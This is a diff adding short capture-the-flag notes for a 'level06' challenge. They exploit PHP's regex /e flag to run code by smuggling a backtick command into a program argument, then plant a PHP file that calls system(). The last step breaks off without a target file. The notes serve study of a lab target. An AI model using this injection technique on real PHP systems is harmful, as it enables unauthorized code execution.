@@ -1,0 +1,20 @@
+php regex has /e flag
+/e flag runs eval.
+
+1. make a file (test.txt):
+
+$ touch test.txt
+
+2. write to this file (test.txt):
+
+$ echo "[x $z]" > test.txt
+
+3. change permissions on level06.php
+
+$ ./level06 test.txt "`mv level06.php level06.php.old`"
+
+	( this runs in level06 user for whatever reason? )
+
+4. add our level06.php which runs getflag:
+
+$ echo "<?php system(\"getflag;\"); ?>"
